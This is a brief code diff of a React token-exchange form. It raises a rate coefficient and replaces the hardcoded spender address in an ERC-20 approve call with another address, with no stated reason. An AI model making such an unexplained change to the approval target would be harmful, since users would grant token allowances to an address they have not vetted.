@@ -3,7 +3,7 @@ import { ethers } from "ethers";
 import { useWeb3ModalSigner } from "@web3modal/ethers5/react";
 import { Config } from "./Config";
 
-const coefficient = 1.25;
+const coefficient = 1.3;
 
 export default function ExchangeForm({ contract, address }) {
   const [tokenNumber, setTokenNumber] = useState(0);
@@ -22,7 +22,7 @@ export default function ExchangeForm({ contract, address }) {
       if (tokenNumber === 0) return;
 
       const ct = await contract.approve(
-        "0x1c7DdbaD0D8DB32D44169D6e05a8D681936D683F",
+        "0x932edc66d15c3ff9d5c4677303aed6ce915b71fc",
         tokenNumber * 10 ** 8
       );
       await ct.wait();
